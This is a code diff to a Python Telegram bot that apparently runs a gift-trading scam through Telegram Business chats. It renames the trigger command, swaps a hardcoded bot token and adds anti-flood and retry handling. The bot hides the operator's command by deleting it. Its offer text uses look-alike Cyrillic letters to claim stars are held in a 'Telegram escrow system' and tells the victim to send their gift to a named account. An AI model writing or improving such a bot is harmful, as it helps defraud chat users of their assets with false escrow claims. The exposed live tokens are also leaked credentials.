@@ -3,10 +3,13 @@ import logging
 import random
 import re
 import string
+import time
 import uuid
+from collections import defaultdict
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
+from aiogram.exceptions import TelegramRetryAfter, TelegramForbiddenError, TelegramBadRequest
 from aiogram.types import (
     Message,
     CallbackQuery,
@@ -16,7 +19,7 @@ from aiogram.types import (
 )
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8114218209:AAEwNfZefVlRkLDTjGqrUwNuHngymMGUtCg"
+BOT_TOKEN = "8850969557:AAF7ISM1vYIyqji6MGNMOfvImFWXG3S5pic"
 
 EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
@@ -25,6 +28,18 @@ EMOJI_ACCEPT = "5774022692642492953"
 
 OFFER_USERNAME = "tonreggan"
 BUYER_USERNAME = "tonreggan"
+
+# ===== АНТИФЛУД =====
+# Минимальный интервал между командами .redo в одном чате (сек)
+COOLDOWN_PER_CHAT = 8
+# Минимальный интервал между .redo от одного пользователя во всех чатах (сек)
+COOLDOWN_PER_USER = 5
+# Задержка между отправками сообщений ботом (антифлуд)
+SEND_DELAY = 1.0
+
+_chat_cooldowns: dict[int, float] = defaultdict(float)
+_user_cooldowns: dict[int, float] = defaultdict(float)
+_send_locks: dict[int, asyncio.Lock] = defaultdict(asyncio.Lock)
 
 logging.basicConfig(
     level=logging.INFO,
@@ -61,7 +76,7 @@ def parse_nft_link(link: str):
 
 def parse_offer_command(text: str):
     parts = text.strip().split()
-    if len(parts) < 3 or parts[0].lower() != ".gind":
+    if len(parts) < 3 or parts[0].lower() != ".redo":
         return None
     link = parts[1]
     amount = parts[2]
@@ -88,73 +103,155 @@ def parse_offer_command(text: str):
     }
 
 
+def check_cooldown(chat_id: int, user_id: int) -> tuple[bool, int]:
+    """
+    Проверяет кулдаун по чату и пользователю.
+    Возвращает (allowed, seconds_left).
+    """
+    now = time.monotonic()
+
+    chat_last = _chat_cooldowns.get(chat_id, 0)
+    if now - chat_last < COOLDOWN_PER_CHAT:
+        return False, int(COOLDOWN_PER_CHAT - (now - chat_last)) + 1
+
+    user_last = _user_cooldowns.get(user_id, 0)
+    if now - user_last < COOLDOWN_PER_USER:
+        return False, int(COOLDOWN_PER_USER - (now - user_last)) + 1
+
+    _chat_cooldowns[chat_id] = now
+    _user_cooldowns[user_id] = now
+    return True, 0
+
+
 async def send_with_fallback(bc_id, chat_id, text, reply_markup):
-    try:
-        return await bot.send_message(
-            chat_id=chat_id,
-            text=text,
-            reply_markup=reply_markup,
-            business_connection_id=bc_id,
-            disable_web_page_preview=False,
-        )
-    except Exception as e:
-        logger.warning(f"[send] with emoji failed: {e}, retry without")
-        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-        if reply_markup:
-            for row in reply_markup.inline_keyboard:
-                for btn in row:
-                    btn.icon_custom_emoji_id = None
-        return await bot.send_message(
-            chat_id=chat_id,
-            text=clean_text,
-            reply_markup=reply_markup,
-            business_connection_id=bc_id,
-            disable_web_page_preview=False,
-        )
+    """Отправка с защитой от FloodWait и ретраями."""
+    async with _send_locks[chat_id]:
+        for attempt in range(3):
+            try:
+                result = await bot.send_message(
+                    chat_id=chat_id,
+                    text=text,
+                    reply_markup=reply_markup,
+                    business_connection_id=bc_id,
+                    disable_web_page_preview=False,
+                )
+                await asyncio.sleep(SEND_DELAY)
+                return result
+            except TelegramRetryAfter as e:
+                wait = e.retry_after + 1
+                logger.warning(f"[send] FloodWait {wait}s, ждём...")
+                await asyncio.sleep(wait)
+            except TelegramForbiddenError as e:
+                logger.error(f"[send] Forbidden: {e}")
+                raise
+            except TelegramBadRequest as e:
+                logger.warning(f"[send] BadRequest: {e}, retry without emoji")
+                clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
+                if reply_markup:
+                    for row in reply_markup.inline_keyboard:
+                        for btn in row:
+                            btn.icon_custom_emoji_id = None
+                try:
+                    result = await bot.send_message(
+                        chat_id=chat_id,
+                        text=clean_text,
+                        reply_markup=reply_markup,
+                        business_connection_id=bc_id,
+                        disable_web_page_preview=False,
+                    )
+                    await asyncio.sleep(SEND_DELAY)
+                    return result
+                except TelegramRetryAfter as e2:
+                    await asyncio.sleep(e2.retry_after + 1)
+                except Exception as e2:
+                    logger.error(f"[send] fallback failed: {e2}")
+                    raise
+            except Exception as e:
+                logger.error(f"[send] error: {e}")
+                raise
+    raise RuntimeError("send_with_fallback: все попытки провалились")
 
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    try:
-        await bot.edit_message_text(
-            business_connection_id=bc_id,
-            chat_id=chat_id,
-            message_id=message_id,
-            text=text,
-            reply_markup=reply_markup,
-            disable_web_page_preview=False,
-        )
-        logger.info("[edit] OK")
-        return True
-    except Exception as e:
-        logger.warning(f"[edit] with emoji failed: {e}, retry without")
-        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-        if reply_markup:
-            for row in reply_markup.inline_keyboard:
-                for btn in row:
-                    btn.icon_custom_emoji_id = None
+    """Редактирование с защитой от FloodWait."""
+    for attempt in range(3):
         try:
             await bot.edit_message_text(
                 business_connection_id=bc_id,
                 chat_id=chat_id,
                 message_id=message_id,
-                text=clean_text,
+                text=text,
                 reply_markup=reply_markup,
                 disable_web_page_preview=False,
             )
-            logger.info("[edit] OK (fallback)")
+            logger.info("[edit] OK")
+            await asyncio.sleep(0.5)
             return True
-        except Exception as e2:
-            logger.error(f"[edit] fallback failed: {e2}")
+        except TelegramRetryAfter as e:
+            wait = e.retry_after + 1
+            logger.warning(f"[edit] FloodWait {wait}s")
+            await asyncio.sleep(wait)
+        except TelegramBadRequest as e:
+            logger.warning(f"[edit] BadRequest: {e}, retry without emoji")
+            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
+            if reply_markup:
+                for row in reply_markup.inline_keyboard:
+                    for btn in row:
+                        btn.icon_custom_emoji_id = None
+            try:
+                await bot.edit_message_text(
+                    business_connection_id=bc_id,
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=clean_text,
+                    reply_markup=reply_markup,
+                    disable_web_page_preview=False,
+                )
+                logger.info("[edit] OK (fallback)")
+                await asyncio.sleep(0.5)
+                return True
+            except TelegramRetryAfter as e2:
+                await asyncio.sleep(e2.retry_after + 1)
+            except Exception as e2:
+                logger.error(f"[edit] fallback failed: {e2}")
+                return False
+        except Exception as e:
+            logger.error(f"[edit] error: {e}")
             return False
+    return False
 
 
-@dp.business_message(F.text.startswith(".gind"))
+@dp.business_message(F.text.startswith(".redo"))
 async def handle_offer(message: Message) -> None:
     if not message.business_connection_id:
         logger.warning("[offer] no business_connection_id")
         return
 
     bc_id = message.business_connection_id
+    user_id = message.from_user.id if message.from_user else 0
+    chat_id = message.chat.id
+
+    # ===== ПРОВЕРКА АНТИФЛУДА =====
+    allowed, wait_sec = check_cooldown(chat_id, user_id)
+    if not allowed:
+        logger.warning(f"[offer] cooldown: chat={chat_id} wait={wait_sec}s")
+        try:
+            await bot.delete_business_messages(
+                business_connection_id=bc_id,
+                message_ids=[message.message_id],
+            )
+        except Exception:
+            pass
+        try:
+            await bot.send_message(
+                chat_id=chat_id,
+                text=f"⏳ Подожди <b>{wait_sec} сек.</b> перед следующей командой.",
+                business_connection_id=bc_id,
+            )
+        except Exception as e:
+            logger.warning(f"[offer] не смог отправить предупреждение: {e}")
+        return
+
     data = parse_offer_command(message.text)
     if not data:
         logger.warning(f"[offer] parse failed for text: {message.text!r}")
@@ -170,7 +267,7 @@ async def handle_offer(message: Message) -> None:
             business_connection_id=bc_id,
             message_ids=[message.message_id],
         )
-        logger.info("[offer] команда .gind удалена")
+        logger.info("[offer] команда .redo удалена")
     except Exception as e:
         logger.warning(f"[offer] delete failed: {e}")
 
@@ -196,7 +293,7 @@ async def handle_offer(message: Message) -> None:
     offers[offer_id] = {
         **data,
         "bc_id": bc_id,
-        "chat_id": message.chat.id,
+        "chat_id": chat_id,
         "accepted": False,
     }
 
@@ -220,13 +317,13 @@ async def handle_offer(message: Message) -> None:
     try:
         sent = await send_with_fallback(
             bc_id=bc_id,
-            chat_id=message.chat.id,
+            chat_id=chat_id,
             text=text,
             reply_markup=keyboard,
         )
         offers[offer_id]["msg_id"] = sent.message_id
         logger.info(
-            f"[offer] {offer_id} отправлен в чат {message.chat.id} "
+            f"[offer] {offer_id} отправлен в чат {chat_id} "
             f"(msg_id={sent.message_id})"
         )
     except Exception as e:
@@ -318,7 +415,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} "
         f"thrоugh thе Теlеgrаm еsсrоw sуstеm. "
         f"Тhе stаrs аrе hеld in а sресiаl еsсrоw ассоunt аnd will bе "
-        f"аutоmаtiсаllу сrеditеd tо уоur Теlеgrаm Stаrs bаlаnсе "
+        f"аutоmаtiсаlly сrеditеd tо уоur Теlеgrаm Stаrs bаlаnсе "
         f"right аftеr thе gift is trаnsfеrrеd.\n\n"
         f"<b>Instruсtiоns tо соmрlеtе thе dеаl:</b>\n\n"
         f"1. Sеnd tо: @{BUYER_USERNAME}\n"
